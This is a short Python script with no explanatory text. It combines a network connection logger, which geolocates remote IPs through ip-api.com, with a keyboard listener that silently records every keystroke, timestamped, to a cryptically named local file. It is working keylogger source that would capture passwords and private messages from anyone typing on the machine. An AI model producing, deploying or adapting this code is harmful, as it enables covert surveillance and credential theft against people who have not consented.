import psutil
import socket
import requests
import time
from datetime import datetime
from pynput import keyboard
import threading

def resolve_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "Unknown"

def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data["status"] == "success":
            return f"{data['city']}, {data['regionName']}, {data['country']} (ISP: {data['isp']})"
        else:
            return "Geo lookup failed"
    except Exception:
        return "Geo lookup error"

def monitor_network():
    while True:
        with open("newo_aqc.txt", "a", encoding="utf-8") as log_file:
            timestamp = datetime.now().isoformat()
            log_file.write(f"\n--- Active Connections at {timestamp} ---\n")

            for conn in psutil.net_connections(kind='inet'):
                if conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                    pid = conn.pid
                    laddr = conn.laddr
                    raddr = conn.raddr
                    try:
                        pname = psutil.Process(pid).name()
                    except Exception:
                        pname = "N/A"
                    rhost = resolve_hostname(raddr.ip)
                    geo = get_geolocation(raddr.ip)
                    log_file.write(f"{pname} (PID: {pid}) {laddr.ip}:{laddr.port} -> {raddr.ip}:{raddr.port} ({rhost}) [{geo}]\n")

        time.sleep(5)

def log_keystrokes():
    def on_press(key):
        timestamp = datetime.now().isoformat()
        try:
            with open("kelo_aqc.txt", "a", encoding="utf-8") as f:
                if key == keyboard.Key.enter:
                    f.write("\n")
                else:
                    f.write(f"{timestamp} - {key}\n")
        except Exception as e:
            print(f"Error: {e}")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

threading.Thread(target=monitor_network, daemon=True).start()
log_keystrokes()
